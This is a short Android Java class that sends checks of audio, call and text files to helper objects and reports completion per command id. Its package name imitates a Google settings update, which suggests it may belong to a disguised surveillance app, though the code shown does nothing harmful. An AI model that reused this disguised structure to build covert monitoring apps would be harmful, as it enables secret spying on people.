package com.setting.dl.google.googlesettingupdate.ptt.checkers;

import android.content.Context;

public class FilesCheckers implements IFilesCheckers, ICheckFilesCompleteListener {
   
   //private final Context                     context;
   private ITextFilesChecker           textFilesChecker;
   private IAudioFilesChecker          audioFilesChecker;
   private ICallFilesChecker           callFilesChecker;
   private ICheckFilesCompleteListener completeListener;
   
   
   public FilesCheckers(Context context, ICheckFilesCompleteListener completeListener) {
      
      //this.context = context;
      this.completeListener = completeListener;
      audioFilesChecker = new AudioFilesChecker(context, this);
      textFilesChecker = new TextFileChecker(context, this);
      callFilesChecker = new CallFilesChecker(context, this);
   }
   
   @Override
   public void checkAudioFiles() {
      checkAudioFiles(null);
   }
   
   @Override
   public void checkAudioFiles(String id) {
      
      audioFilesChecker.checkAudioFiles(id);
   }
   
   @Override
   public void checkCallFiles() {
      checkCallFiles(null);
   }
   
   @Override
   public void checkCallFiles(String id) {
      
      callFilesChecker.checkCallFiles(id);
   }
   
   @Override
   public void checkTextFiles(String id) {
      
      textFilesChecker.checkTextFiles(id);
   }
   
   @Override
   public void checkTextFiles() {
      checkTextFiles(null);
   }
   
   @Override
   public void onCheckComplete(String commandId) {
      
      if (completeListener != null) completeListener.onCheckComplete(commandId);
   }
   
   public static boolean timeIsUP(long lastCheck, long limit) {
      
      long now   = System.currentTimeMillis();
      long inter = now - lastCheck;
      
      return inter > limit;
   }
   
}
